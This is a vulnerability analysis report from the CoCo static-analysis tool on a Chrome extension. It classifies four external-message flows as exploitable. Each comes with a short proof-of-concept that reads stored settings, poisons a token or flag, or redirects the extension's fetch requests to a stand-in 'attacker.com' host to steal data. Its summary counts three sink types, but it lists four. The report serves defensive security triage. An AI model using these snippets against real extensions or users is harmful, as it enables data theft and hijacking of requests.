# CoCo Analysis: dooinopjfnhlmmdkdepajfipfhlcmjgp

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 types (sendResponseExternal_sink, chrome_storage_local_set_sink, chrome_storage_local_clear_sink)

---

## Sink 1: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dooinopjfnhlmmdkdepajfipfhlcmjgp/opgen_generated_files/bg.js
Line 751    var storage_local_get_source = { 'key': 'value' };
Line 1077   callback({onboarding: storage.onboarding, settings: storage.settings});
```

**Code:**

```javascript
// Background script - External message handler (lines 1067-1083)
chrome.runtime.onMessageExternal.addListener(function (req, sender, callback) {
  if (req.cmd == 'getLegacySettingsOnce') {
    chrome.storage.local.get({haveRetrievedLegacySettings: false, onboarding: '', settings: ''}, function (storage) {
      if (!storage.haveRetrievedLegacySettings) {
        chrome.storage.local.set({haveRetrievedLegacySettings: true}, function () {
          callback({onboarding: storage.onboarding, settings: storage.settings}); // ← sends storage data back to external attacker
        });
      } else {
        callback({alreadyDone: true});
      }
    });
    return true;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal from whitelisted domains (https://*.crankwheel.com/*, https://*.meeting.is/*)

**Attack:**

```javascript
// From a page on crankwheel.com or meeting.is domain:
chrome.runtime.sendMessage('extension-id', {
  cmd: 'getLegacySettingsOnce'
}, function(response) {
  console.log('Stolen settings:', response.onboarding, response.settings);
});
```

**Impact:** Information disclosure - external attacker can read sensitive `onboarding` and `settings` data from chrome.storage.local and receive it back via the callback.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (SSRF via serverUrl)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dooinopjfnhlmmdkdepajfipfhlcmjgp/opgen_generated_files/bg.js
Line 1087   setServerUrl(req.url);
```

**Code:**

```javascript
// Background script - External message handler (lines 1084-1088)
chrome.runtime.onMessageExternal.addListener(function (req, sender, callback) {
  if (req.cmd == 'setServerUrl') {
    setServerUrl(req.url); // ← attacker-controlled URL
    return false;
  }
});

// Function that stores the URL (lines 988-990)
function setServerUrl(url) {
  objStorageSet({'serverUrl': url}); // Stores in chrome.storage.local
}

function objStorageSet(keyVals) {
  chrome.storage.local.set(keyVals);
}

// Later usage in fetch requests (lines 1355-1364)
getServerUrl(function (serverUrl) {
  var url = serverUrl + uri + '?' + new URLSearchParams(params).toString(); // ← poisoned serverUrl
  fetch(url, {  // ← SSRF to attacker-controlled URL
    method: 'POST',
    body: ''
  })
  .then(function (returnedValue) {
    if (callback) {
      callback(returnedValue);
    }
  });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal from whitelisted domains

**Attack:**

```javascript
// From a page on crankwheel.com or meeting.is domain:
chrome.runtime.sendMessage('extension-id', {
  cmd: 'setServerUrl',
  url: 'https://attacker.com/steal-data'
});

// Later, when extension makes requests, they go to attacker.com
```

**Impact:** Complete storage exploitation chain leading to SSRF - attacker poisons serverUrl in storage, which is later retrieved and used in privileged fetch() requests. The attacker can redirect extension's network requests to attacker-controlled servers, potentially stealing data or performing unauthorized actions.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (token poisoning)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dooinopjfnhlmmdkdepajfipfhlcmjgp/opgen_generated_files/bg.js
Line 1093   setInstantDemosToken(req.token);
```

**Code:**

```javascript
// Background script - External message handler (lines 1092-1094)
chrome.runtime.onMessageExternal.addListener(function (req, sender, callback) {
  if (req.cmd == 'setInstantDemosToken') {
    setInstantDemosToken(req.token); // ← attacker-controlled token
    return false;
  }
});

// Function that stores the token (lines 1346-1348)
function setInstantDemosToken(token) {
  objStorageSet({instantDemosToken: token}); // Stores in chrome.storage.local
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal from whitelisted domains

**Attack:**

```javascript
// From a page on crankwheel.com or meeting.is domain:
chrome.runtime.sendMessage('extension-id', {
  cmd: 'setInstantDemosToken',
  token: 'malicious-token-value'
});
```

**Impact:** Storage poisoning with complete exploitation chain - attacker can poison the instantDemosToken which is later retrieved and used by the extension, potentially compromising authentication or authorization mechanisms.

---

## Sink 4: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (reloadOnPopupClose)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dooinopjfnhlmmdkdepajfipfhlcmjgp/opgen_generated_files/bg.js
Line 1114   chrome.storage.local.set({reloadOnPopupClose: req.reloadOnPopupClose});
```

**Code:**

```javascript
// Background script - External message handler (lines 1111-1114)
chrome.runtime.onMessageExternal.addListener(function (req, sender, callback) {
  if (req.cmd == 'setReloadOnPopupClose') {
    chrome.storage.local.set({reloadOnPopupClose: req.reloadOnPopupClose}); // ← attacker-controlled value
  }
});

// Later retrieval and use (lines 1168-1170)
chrome.storage.local.get({reloadOnPopupClose: false}, function (stg) {
  if (stg.reloadOnPopupClose === true) {
    // Triggers tab reload behavior
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal from whitelisted domains

**Attack:**

```javascript
// From a page on crankwheel.com or meeting.is domain:
chrome.runtime.sendMessage('extension-id', {
  cmd: 'setReloadOnPopupClose',
  reloadOnPopupClose: true
});
```

**Impact:** Complete storage exploitation chain - attacker can control extension behavior by poisoning the reloadOnPopupClose flag, causing unintended tab reloads and disrupting user experience.
